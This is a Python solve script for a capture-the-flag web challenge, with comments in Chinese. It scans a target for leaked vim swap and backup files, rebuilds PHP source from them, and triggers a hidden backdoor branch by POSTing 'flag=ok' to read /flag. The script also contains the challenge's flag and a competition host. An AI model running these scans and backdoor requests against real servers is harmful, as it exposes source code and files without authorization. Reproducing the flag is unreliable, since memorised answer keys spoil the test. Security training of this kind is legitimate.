#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
solve.py — 环节二 web01「编辑器 swap 残留文件泄露源码 → 后门参数取 flag」

题面：小明在服务器上直接编辑文件时，不小心意外退出环境。
qid : znIYXp9PSqJDvX43    分值: 500    分类: web
flag: flag{6e0771cc-4c99-4eb8-abcf-1a826648ff84}

考点
----
1) vim 非正常退出 → 同目录留下 `.<name>.swp` / `.swo` / `.swn` 交换文件；Web 目录
   若未禁止点号开头的文件，可直接下载 → 源码泄露（同族还有 `.bak/.old/~/.save/.orig`）。
2) **swap 文件按 1024 字节块存放被编辑文件的原始字节**（`b0VIM 8.0` 头 + 磁盘块副本）。
   因此**必须裸扫连续可打印段**（printable run）来还原源码；
   按 1024 字节块对齐去扫描会漏掉跨界数据。
3) 还原出的 `vi.php` 有一个隐藏后门分支：
       if (@$_POST['flag'] == 'ok') { echo file_get_contents('/flag'); }
   直接 POST `flag=ok` 即可读出 flag。

用法
----
    python solve.py --target http://127.0.0.1:8080          # 本地复现
    python solve.py --target https://<容器域名>:80           # 比赛容器（地址每轮下发改动）
    python solve.py                                          # 用内置的原始比赛地址
    python solve.py --target ... --submit                   # 取到后自动提交平台校验
    python solve.py --target ... --json                     # 机器可读输出
"""
from __future__ import annotations

import argparse
import json
import re
import sys

import requests
import urllib3

urllib3.disable_warnings()

# 比赛期间的真实地址（会随平台 reset 变化，用 --target 覆盖）
COMPETITION_TARGET = 'https://eci-2ze5h3h8k8ghqoet0une.cloudeci1.ichunqiu.com:80'
QID = 'znIYXp9PSqJDvX43'
FLAG_RE = re.compile(r'flag\{[^}]{1,200}\}')
FLAG_RE_B = re.compile(rb'flag\{[^}]{1,200}\}')      # bytes 版（swap 是二进制）

# 编辑器残留 / 备份后缀清单（本题设计思路的核心：dotfile 泄露）
SWAP_SUFFIXES = ['.swp', '.swo', '.swn']
BACKUP_SUFFIXES = ['.bak', '.old', '~', '.save', '.orig', '.un~', '.tmp', '.copy']
BASENAMES = ['index.php', 'vi.php', 'flag.php', 'config.php', 'db.php']

# 源码还原时用于筛选可打印段的关键字
CODE_KEYS = ('<?php', '$_POST', '$_GET', '$_REQUEST', 'file_get_contents', 'echo',
             'flag', 'system', 'exec', 'include', 'require')


def build_wordlist(extra: list[str] | None = None) -> list[str]:
    """生成候选残留文件路径（点号前缀 = vim 的 `.<file>.swp` 命名规则）"""
    cands: list[str] = []
    for base in BASENAMES:
        for s in SWAP_SUFFIXES:
            cands.append(f'/.{base}{s}')      # vim: .vi.php.swp
            cands.append(f'/{base}{s}')       # 无点变体
            cands.append(f'/.{base}.sw' + s[-1])   # 冗余写法，容错
        for s in BACKUP_SUFFIXES:
            cands.append(f'/.{base}{s}')      # emacs/编辑器的 .#file / file~
            cands.append(f'/{base}{s}')
    # 去重保序
    seen, out = set(), []
    for c in cands:
        if c not in seen:
            seen.add(c)
            out.append(c)
    if extra:
        out = list(extra) + out
    return out


def printable_runs(data: bytes, minlen: int = 5) -> list[str]:
    """裸扫连续可打印 ASCII 段。

    ★ 这是本题最容易踩的坑：vim swap 以 **1024 字节块**存放原始文件字节，
    源码往往跨块存放（块尾 chunk 结尾 + 下一块开头）。按 1KB 对齐切片再过滤
    会丢掉跨界的那一段，必须对整份文件做流式 printable-run 扫描。
    """
    out: list[str] = []
    cur = bytearray()
    for b in data:
        if 0x20 <= b < 0x7F or b in (0x09, 0x0A, 0x0D):
            cur.append(b)
        else:
            if len(cur) >= minlen:
                out.append(cur.decode('latin-1'))
            cur = bytearray()
    if len(cur) >= minlen:
        out.append(cur.decode('latin-1'))
    return out


def swap_metadata(data: bytes) -> dict:
    """解析 vim swap 头：b0VIM <ver>\0<user>\0<hostname>\0<path>"""
    meta: dict = {'magic': None, 'version': None, 'user': None, 'host': None, 'path': None}
    if not data.startswith(b'b0VIM'):
        return meta
    meta['magic'] = data[:5].decode('latin-1')
    parts = data[5:].split(b'\x00')
    if len(parts) >= 4:
        meta['version'] = parts[0].decode('latin-1', 'replace')
        meta['user'] = parts[1].decode('latin-1', 'replace')
        meta['host'] = parts[2].decode('latin-1', 'replace')
        meta['path'] = parts[3].decode('latin-1', 'replace')
    return meta


def recover_backdoor(runs: list[str]) -> dict:
    """从可打印段中还原后门逻辑（比较条件 + 读取文件 + 输出）"""
    joined = '\n'.join(runs)
    info = {
        'post_param': None,
        'post_value': None,
        'read_file': None,
        'snippets': [],
    }
    m = re.search(r"\$_POST\['([^']+)'\]\s*==?\s*'([^']*)'", joined)
    if m:
        info['post_param'], info['post_value'] = m.group(1), m.group(2)
    m = re.search(r"file_get_contents\(\s*'([^']+)'\s*\)", joined)
    if m:
        info['read_file'] = m.group(1)
    for r in runs:
        if any(k in r for k in ('<?php', '$_POST', 'file_get_contents')):
            info['snippets'].append(r.strip())
    return info


def solve(target: str, verbose: bool = True, extra_paths: list[str] | None = None) -> dict:
    target = target.rstrip('/')
    s = requests.Session()
    s.trust_env = False          # 绕系统代理（本机常有代理，会把靶场请求吃掉）
    result: dict = {'target': target, 'hits': [], 'recovered': None, 'flag': None,
                    'endpoint': None, 'steps': []}

    def log(msg):
        if verbose:
            print(msg, flush=True)

    log(f'[*] target = {target}')

    # ---------- 步骤 1：目录扫描编辑器残留 / 备份文件 ----------
    log('\n=== 1) 扫描编辑器残留与备份文件（dotfile 泄露面）===')
    hits: dict[str, bytes] = {}
    for p in build_wordlist(extra_paths):
        try:
            r = s.get(target + p, timeout=15, verify=False, allow_redirects=False)
        except Exception as e:
            log(f'  {p:26s} ERR {type(e).__name__}')
            continue
        tag = ''
        if r.status_code == 200 and len(r.content) > 100:
            hits[p] = r.content
            tag = '  <== HIT'
            if r.content.startswith(b'b0VIM'):
                tag += f' [vim swap, header={r.content[:5].decode("latin-1")}]'
        if r.status_code != 404 or tag:
            log(f'  {p:26s} -> {r.status_code} len={len(r.content)}{tag}')
    result['hits'] = [{'path': k, 'size': len(v)} for k, v in hits.items()]
    if not hits:
        log('[!] 未命中任何残留/备份文件（容器可能未下发或地址已轮换；重跑本脚本）')
        return result

    # ---------- 步骤 2：裸扫可打印段还原源码 ----------
    log('\n=== 2) swap → 源码还原（裸扫 printable run，不按 1024B 块对齐）===')
    for p, data in hits.items():
        m = FLAG_RE_B.search(data)               # data 是 bytes，用 bytes 版正则
        if m:                                     # 残片里直接有 flag 的极端情况
            result['flag'] = m.group(0).decode()
            log(f'  [+] {p} 残片中直接出现 flag')
            return result
        meta = swap_metadata(data)
        if meta['magic']:
            log(f"  [{p}] vim swap v{meta['version']} user={meta['user']} "
                f"host={meta['host']} 被编辑文件={meta['path']}")
        runs = printable_runs(data)
        info = recover_backdoor(runs)
        log(f'  [{p}] 可打印段 {len(runs)} 个；后门线索: '
            f"POST[{info['post_param']}]=='{info['post_value']}' "
            f"read={info['read_file']}")
        for sn in info['snippets'][:4]:
            log(f'        {sn[:150]}')
        if info['post_param'] or info['read_file']:
            result['recovered'] = {'path': p, **info}
            break

    # ---------- 步骤 3：按还原出的后门逻辑取 flag ----------
    log('\n=== 3) 按还原出的后门分支直取 flag ===')
    rec = result['recovered'] or {}
    param = rec.get('post_param') or 'flag'
    value = rec.get('post_value') or 'ok'
    endpoints = ['/vi.php', '/index.php', '/']
    for ep in endpoints:
        try:
            r = s.post(target + ep, data={param: value}, timeout=20,
                       verify=False, allow_redirects=False)
        except Exception as e:
            log(f'  POST {ep} ERR {type(e).__name__}')
            continue
        m = FLAG_RE_B.search(r.content)
        head = r.content[:90].decode('utf-8', 'replace').replace('\n', ' ')
        log(f'  POST {ep} body={param}={value} -> {r.status_code} '
            f'len={len(r.content)}  {m.group(0).decode() if m else head}')
        if m:
            result['flag'] = m.group(0).decode()
            result['endpoint'] = f'POST {ep} {param}={value}'
            return result
    return result


def main() -> int:
    ap = argparse.ArgumentParser(description='环节二 web01 · vim swap 源码泄露')
    ap.add_argument('--target', '-t', default=COMPETITION_TARGET,
                    help='靶场基址，如 http://127.0.0.1:8080')
    ap.add_argument('--path', action='append', default=None,
                    help='额外的残留文件路径（可多次）')
    ap.add_argument('--submit', action='store_true', help='取到 flag 后提交平台')
    ap.add_argument('--json', action='store_true', help='以 JSON 输出结果')
    args = ap.parse_args()

    res = solve(args.target, verbose=not args.json, extra_paths=args.path)

    if args.json:
        print(json.dumps(res, ensure_ascii=False, indent=2))
    elif res['flag']:
        print(f"\n[+] FLAG = {res['flag']}")
        print(f"[+] 取 flag 端点: {res['endpoint']}")
    else:
        print('\n[-] 未取到 flag')

    if args.submit and res['flag']:
        sys.path.insert(0, r'D:\2026\湾区杯\决赛')
        try:
            import agent_api as A
            print('[SUBMIT]', A.api_submit(A.load_token(), QID, res['flag']))
        except Exception as e:
            print('[!] 提交失败:', e)
    return 0 if res['flag'] else 1


if __name__ == '__main__':
    sys.exit(main())
